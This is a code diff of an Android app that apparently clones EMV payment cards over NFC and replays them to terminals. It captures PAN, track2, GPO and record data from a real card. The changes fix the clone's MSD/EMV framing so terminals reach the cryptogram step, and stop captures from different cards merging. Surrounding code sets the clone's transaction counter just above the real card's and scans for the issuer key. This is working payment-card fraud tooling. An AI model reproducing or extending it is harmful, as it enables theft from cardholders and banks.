@@ -403,8 +403,10 @@ public class MainActivity extends AppCompatActivity {
         sb.append("5A  PAN    : ")
                 .append(pan.isEmpty() ? "4111111111111111  <-- DEFAULT, fill the PAN" : pan)
                 .append('\n');
-        sb.append("5F24 expiry: ")
-                .append(exp.isEmpty() ? "3112  <-- DEFAULT" : exp).append("00").append('\n');
+        // the emulator pads YYMM to YYMM01 - show what actually goes on the wire
+        String expOut = exp.isEmpty() ? "3112  <-- DEFAULT" : exp;
+        if (exp.length() == 4) expOut = exp + "01";
+        sb.append("5F24 expiry: ").append(expOut).append('\n');
         sb.append("57  track2 : ")
                 .append(track2.isEmpty() ? "(empty)" : hexOf(track2)).append('\n');
 
@@ -799,7 +801,10 @@ public class MainActivity extends AppCompatActivity {
         etService.setText(service);
         etTrack2.setText(track2);
         etAid.setText(aid);
-        etMsd.setText("1");
+        // MSD framing must follow the card we captured, not a hardcoded default.
+        // The reader stored a 77 GPO response for an EMV card; answering in
+        // magstripe framing made the terminal give up before the cryptogram.
+        etMsd.setText(String.valueOf(msdFromCapture()));
         etDiscretionary.setText(track2.isEmpty() ? disc : "");
         if (!iad.isEmpty()) etIad.setText(iad);
         if (!aip.isEmpty()) etAip.setText(aip);
@@ -813,7 +818,13 @@ public class MainActivity extends AppCompatActivity {
         adapter.notifyItemChanged(current);
         pager.smoothScrollToPosition(current);
         prefs.edit().putInt("selected", current).apply();
-        txtStatus.setText("Cloned - check it, then SAVE");
+
+        int recs = stagedRecordCount();
+        if (recs == 0) {
+            txtStatus.setText("Cloned - no records captured, terminal will get a synthetic one");
+        } else {
+            txtStatus.setText("Cloned " + recs + " records - check it, then SAVE");
+        }
         Toast.makeText(this, "Card cloned - review, then hit SAVE", Toast.LENGTH_LONG).show();
 
         // the reader just captured a real cryptogram - hunt for the issuer key
@@ -821,6 +832,25 @@ public class MainActivity extends AppCompatActivity {
                 && !prefs.getString(key(current, "cap_rawgenac"), "").isEmpty()) {
             scanForKey(false);
         }
+    }
+
+    /** 1 = magstripe framing, 0 = EMV framing. Read it off the captured GPO. */
+    private int msdFromCapture() {
+        String gpo = prefs.getString("cap_rawgpo", "");
+        if (gpo.length() < 2) return 1;
+        try {
+            return (Integer.parseInt(gpo.substring(0, 2), 16) == 0x80) ? 1 : 0;
+        } catch (NumberFormatException e) {
+            return 1;
+        }
+    }
+
+    private int stagedRecordCount() {
+        int n = 0;
+        for (String k : prefs.getAll().keySet()) {
+            if (k.startsWith("cap_rec")) n++;
+        }
+        return n;
     }
 
     /** Start the clone's ATC just above the value the real card last used. */
@@ -837,10 +867,22 @@ public class MainActivity extends AppCompatActivity {
      * The reader writes its capture into a staging area under "cap_". Move it
      * onto the wallet card that was just written, so two cloned cards cannot
      * overwrite each other and the emulator always MACs the right PAN.
+     *
+     * The card's own cap_ keys are cleared first. Without that, cloning into the
+     * same slot twice merges the two captures, and because the emulator derives
+     * its AFL from these keys a leftover rec1_1 would be advertised and served -
+     * card A's data answering for card B.
      */
     private void copyStagingToCard(int index) {
         SharedPreferences.Editor e = prefs.edit();
         String dst = key(index, "cap_");
+
+        List<String> stale = new ArrayList<>();
+        for (String k : prefs.getAll().keySet()) {
+            if (k.startsWith(dst)) stale.add(k);
+        }
+        for (String k : stale) e.remove(k);
+
         for (String k : prefs.getAll().keySet()) {
             if (k.startsWith("cap_")) {
                 e.putString(dst + k.substring(4), prefs.getString(k, ""));
